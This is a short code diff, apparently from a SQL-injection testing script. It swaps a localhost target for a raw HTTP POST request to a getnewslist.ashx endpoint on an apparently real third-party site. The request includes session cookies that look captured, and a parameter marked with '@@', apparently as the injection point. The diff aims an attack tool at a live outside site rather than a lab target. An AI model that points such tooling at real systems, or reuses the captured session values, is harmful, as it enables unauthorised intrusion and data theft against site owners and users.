@@ -10,7 +10,19 @@ g_sql_info.lower_ratio = LOWER_RATIO
 
 
 req = '''
-http://127.0.0.1/guest/edit.php?id=2
+POST /getnewslist.ashx HTTP/1.1
+Content-Length: 68
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: xmlHttpRequest
+Referer: http://www.wcyz.com
+Cookie: ASP.NET_SessionId=2o2rucqo5z4q5a55c5c33ond; FSSBBIl1UgzbN7N80T=3m7dJa7qnIhoPQB1COCmJb77ogvvdVa0GEm4LHXxJx_8mNud_3P.zf20JhYErh.LzILHAOJLOADaCGSeNOPo.0Lkxfzeir54JOhxsrHX4xuJrrGUI8Vx971F17v.i0nm2GfcEf6kmO8UFMeQsidfum5OScvfvhvAaEYTsGqkEQIEMmPRqEBYxzVtk5GDydtt_Rqg; FSSBBIl1UgzbN7N80S=iVV1A9koXCXc5iBELDZMx_WrTjXeoB0mMhql2OtZA5e6zzWtwjx98bJNgs4gtRM3
+Host: www.wcyz.com
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+newsclass=qdgkiQnq@@&pageindex=1
 '''
 
 
